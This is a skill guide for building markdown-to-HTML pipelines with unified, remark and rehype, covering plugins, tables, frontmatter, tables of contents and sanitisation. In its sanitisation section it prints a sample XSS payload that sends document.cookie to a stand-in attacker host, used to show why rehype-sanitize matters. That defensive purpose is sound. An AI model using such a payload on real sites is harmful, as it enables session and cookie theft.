---
title: Markdown Pipelines with remark Skill
category: Document
description: A working guide to building real markdown pipelines on unified/remark/rehype — the mdast → hast → HTML path, custom tree-walking plugins, GFM tables and footnotes, YAML frontmatter, and the sanitisation step most tutorials skip. Written for people who have already lost a weekend to a regex markdown parser and want the AST approach done right the first time.
usage: Load this skill when a user asks to render, transform, lint, or extract data from markdown — blog engines, docs sites, changelogs, or "render this user-submitted markdown." Start with the pipeline order in section 3.1, and never let generated HTML reach the DOM without the sanitise stage in section 3.5. Use the anti-patterns list as a review pass on any markdown code you produce.
platforms: [Claude, Cursor]
priceUsd: 0
timeSavedHours: 10
pocUrl: https://github.com/remarkjs/remark
---
# Markdown Pipelines with remark Skill

## 1. Philosophy

Every markdown feature request starts the same way: "just swap the `**` for `<strong>`
with a regex." That works for about four days. Then someone writes `**bold**` inside a
code span, or a fence containing markdown, or a table cell with an escaped pipe, and you
learn that markdown is a context-sensitive grammar wearing a text format's clothing.
Regex has no concept of "inside a code fence." It never will.

1. **Parse to a tree, transform the tree, serialise the tree.** Never operate on the
   markdown string, and never on the HTML string — both are lossy views.
2. **Two trees, not one.** mdast knows headings and link references; hast knows elements
   and attributes. The bridge between them is where your custom logic belongs, and
   confusing the two is where the bugs come from.
3. **Sanitise on the hast side, always.** Markdown is a syntax *for HTML*. A pipeline
   taking untrusted markdown without `rehype-sanitize` is an XSS hole with a nice API.
4. **The tree is also your data.** A TOC, a link audit, a word count — each is one walk.

## 2. Tech Stack

- **Project:** remark — https://github.com/remarkjs/remark — MIT licensed. Part of the
  unified collective (unified, remark, rehype, mdast, hast, unist), MIT throughout.
- This skill is an independent, original guide; it is not affiliated with or endorsed by
  the remark maintainers.
- **Core:** `unified`, `remark-parse` (md → mdast), `remark-rehype` (mdast → hast),
  `rehype-stringify` (hast → HTML).
- **Near-mandatory:** `remark-gfm` (tables, footnotes, strikethrough) + `rehype-sanitize`.
- **Common:** `remark-frontmatter` + `yaml`, `rehype-slug` + `rehype-autolink-headings`,
  `rehype-highlight`, and `unist-util-visit` for every plugin you write.
- **ESM only.** Pinning to remark 12 to keep `require()` alive puts you two majors behind
  with no GFM footnotes.

## 3. Patterns

### 3.1 The pipeline, in the only order that works

```js
const processor = unified()
  .use(remarkParse)                         // md text → mdast
  .use(remarkFrontmatter, ['yaml'])         // mdast: --- block becomes a node
  .use(remarkGfm)                           // mdast: tables, footnotes, strikethrough
  .use(myCustomMdastPlugin)                 // mdast: your transforms go HERE
  .use(remarkRehype, { allowDangerousHtml: false })   // mdast → hast
  .use(rehypeSlug)                          // hast: id="my-heading"
  .use(rehypeSanitize, schema)              // hast: strip anything unsafe
  .use(rehypeStringify);                    // hast → HTML text
```

Order is not stylistic. `remark-gfm` after `remark-rehype` does nothing — the markdown is
already gone. `rehype-sanitize` before `rehype-slug` strips the ids you just added (the
default schema disallows arbitrary `id`). Sanitise last, and configure the *schema*
rather than reordering around it.

### 3.2 A plugin is a function returning a transformer

That is the entire API. This one links bare `@username` mentions:

```js
import { visit, SKIP } from 'unist-util-visit';
const RE = /@([a-z0-9_]{2,30})/gi;
const txt = (value) => ({ type: 'text', value });

export function remarkMentions({ base = 'https://example.com/u/' } = {}) {
  return (tree) => visit(tree, 'text', (node, index, parent) => {
    if (!parent || parent.type === 'link' || parent.type === 'linkReference') return;
    const out = [];
    let last = 0;
    for (const m of node.value.matchAll(RE)) {
      if (m.index > last) out.push(txt(node.value.slice(last, m.index)));
      out.push({ type: 'link', url: base + m[1], children: [txt(m[0])] });
      last = m.index + m[0].length;
    }
    if (!out.length) return;
    if (last < node.value.length) out.push(txt(node.value.slice(last)));
    parent.children.splice(index, 1, ...out);
    return [SKIP, index + out.length];      // skip our own output; don't re-scan
  });
}
```

Two details that cost hours. `visit` on `'text'` never enters `code` or `inlineCode` —
their content is a `value` string, not child text nodes, so "skip code blocks" solves
itself the moment you stop regexing the source. And the `[SKIP, ...]` return is
mandatory: splice without a new index and the visitor walks into your own output —
infinite loop, or silently doubled links.

### 3.3 remark-gfm: what it actually buys you

CommonMark has **no tables and no footnotes**. "My table renders as a paragraph of pipes"
means you forgot `remark-gfm`. It adds `table`/`tableRow`/`tableCell`,
`footnoteDefinition`/`footnoteReference`, `delete` for strikethrough, and `checked` on
`listItem`. Alignment lives on the `table` node as `align: ['left', null, 'right']` — one
entry per column, *not* on the cells. Cost: roughly 40–60KB of bundle. Irrelevant at
build time; measure before shipping it to a browser rendering 400 comments.

### 3.4 Metadata rides on the VFile: frontmatter and TOC in one pass

`remark-frontmatter` only teaches the parser that `---` is a node — reading the YAML is
your job. Slicing between the first two `---` instead breaks the first time a document
has a rule near the top, or a fence containing `---`.

```js
export function remarkExtractFrontmatter() {
  return (tree, file) => {
    const node = tree.children[0];
    if (!node || node.type !== 'yaml') return;
    try { file.data.frontmatter = parse(node.value) ?? {}; }   // the 'yaml' package
    catch (err) { file.fail(`Bad frontmatter: ${err.message}`, node.position, 'fm'); }
    tree.children.shift();    // remove it so it never reaches the HTML
  };
}

export function remarkToc() {
  return (tree, file) => {
    const slugger = new GithubSlugger();   // per document — it dedupes "intro", "intro-1"
    file.data.toc = [];
    visit(tree, 'heading', (node) => {
      if (node.depth < 2 || node.depth > 3) return;
      const text = toString(node);         // mdast-util-to-string
      file.data.toc.push({ depth: node.depth, text, id: slugger.slug(text) });
    });
  };
}
```

`mdast-util-to-string` matters: `## The \`useEffect\` trap` has three child nodes, and
`node.children[0].value` gives you `"The "`. The slugger must be per document, or page
2's headings start at `-1`. These ids match `rehype-slug` because both use
`github-slugger` — hand-rolled slugs 404 against your own anchors.

### 3.5 The hast stage: sanitisation and highlighting

The reflex is "markdown is safe, it's just text." Markdown is a syntax for HTML, and this
is valid markdown:

```md
[click me](javascript:alert(document.cookie))
<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">
```

The link survives `remark-rehype` untouched. The raw `<img>` survives too the moment
someone enables `allowDangerousHtml` — and someone always does, because a user wanted
`<details>`. Pipe that into `dangerouslySetInnerHTML` and you have shipped stored XSS.

```js
import rehypeSanitize, { defaultSchema } from 'rehype-sanitize';

const schema = {
  ...defaultSchema,
  attributes: {
    ...defaultSchema.attributes,
    // rehype-slug's ids and rehype-highlight's classes are stripped by default:
    '*': [...(defaultSchema.attributes['*'] ?? []), 'id', 'className'],
    code: [['className', /^language-./]],
  },
  tagNames: [...defaultSchema.tagNames, 'details', 'summary'],
};

.use(remarkRehype)
.use(rehypeSlug)
.use(rehypeHighlight, { detect: false, ignoreMissing: true })
.use(rehypeSanitize, schema)     // AFTER slug/highlight, BEFORE stringify
.use(rehypeStringify);
```

The default schema is close to GitHub's: it drops `javascript:` URLs, event handlers,
`<script>`, `<style>`, and unknown elements. Extend it one tag at a time; never replace
it wholesale. Content you authored may skip sanitisation. Anything a user typed may not —
not comments, not bios, not "internal only" wikis.

Highlighting is a hast concern, so it lands here. `ignoreMissing: true` is not optional:
one fence tagged with a language the highlighter doesn't know throws and takes the build
down. `detect: false` stops it guessing on unlabelled fences, which produces confidently
wrong colouring on config snippets. Highlight at build time — zero KB to the client.

### 3.6 Sync vs async, and positional info

```js
const html = String(processor.processSync(md));   // legal only if EVERY plugin is sync
const file = await processor.process(md);         // the default; always safe
const { frontmatter, toc } = file.data;           // your plugins' output rides along

visit(tree, 'link', (node) => {                   // inside a linter plugin
  if (node.url.startsWith('http://')) {
    file.message('Insecure http:// link', node.position, 'links:no-http');
  }
});
for (const m of file.messages) console.warn(`${file.path}:${m.line}:${m.column} ${m.reason}`);
// → docs/setup.md:41:7 Insecure http:// link
```

Grammar-loading highlighters and anything touching network or disk are async, so
`processSync` is a footgun in any pipeline you expect to grow. Every mdast node carries
`node.position`, which makes a docs linter — broken links, missing alt text, skipped
heading levels — about thirty lines, with line numbers pointing at real source.

## 4. Anti-patterns

- **Regex markdown parsing.** `str.replace(/\*\*(.+?)\*\*/g, ...)` cannot see code
  fences, cannot balance nesting, and cannot be incrementally fixed into correctness.
- **`dangerouslySetInnerHTML` on unsanitised output.** Stored XSS. No version of "our
  users are internal" survives an incident review.
- **`allowDangerousHtml: true` with no `rehype-raw` + sanitise behind it.** You enabled
  raw HTML passthrough and disabled the only thing that made it safe.
- **Regexing the HTML after stringify.** Whatever you're about to do is a rehype plugin,
  and the plugin is shorter.
- **Splicing `parent.children` in `visit` without returning a new index.** Infinite loops
  and duplicate nodes, only on documents with many matches.
- **Re-parsing to build a TOC.** Two parses, two sluggers, two chances to disagree — and
  the anchors will disagree.
- **Sanitising before slug/highlight.** The schema strips the `id` and `className` those
  plugins just added, and you lose an afternoon convinced they're broken.
- **Defaulting to `processSync`.** Fine until the first async plugin, then it fails with
  an error naming neither the plugin nor the cause.
- **A module-level `GithubSlugger`.** Shared state; page 2's `#intro` becomes `#intro-1`.

## 5. Usage

1. State the pipeline in order before writing plugin code: parse → mdast transforms →
   rehype → hast transforms → sanitise → stringify (§3.1).
2. Declare trust level in one line — *authored by us* (sanitise optional) or
   *user-supplied* (sanitise mandatory, §3.5). Never leave it implicit.
3. Every custom transform is a `unist-util-visit` plugin on the tree whose vocabulary
   matches the change: content → mdast, presentation → hast.
4. Metadata rides on `file.data` / `file.messages` from the same pass — never a reparse.
5. Review against every §4 anti-pattern. Test with: a fence full of markdown, a table
   with escaped pipes, a heading with inline code, and a hostile input carrying
   `javascript:` and `onerror=`.

## 6. Example Output

A changelog-and-docs renderer for a small product site, built with this skill:

- One processor, built once at module scope, reused across ~180 files at build time:
  parse → frontmatter extract → gfm → custom `remarkMentions` and `remarkLinkAudit` →
  rehype → slug → autolink-headings → highlight → sanitize (schema extended for `id`,
  `hljs-*`, and `details`/`summary`) → stringify.
- `file.data.frontmatter` feeds the route table and `<meta>` tags; `file.data.toc` feeds
  the sticky sidebar. Same single pass; whole-corpus build stays under two seconds.
- `remarkLinkAudit` emits `file.message()` with real positions for `http://` links and
  relative links pointing at missing files. CI fails and prints
  `docs/guides/setup.md:41:7  Broken relative link ../instal.md  (links:exists)`.
- The comment widget runs a deliberately smaller second processor: parse → gfm → rehype →
  sanitize (default schema, unextended) → stringify. No slugs, no highlighting, no raw
  HTML. Different trust level, different pipeline — decided at §3.1, not patched in after
  a report.
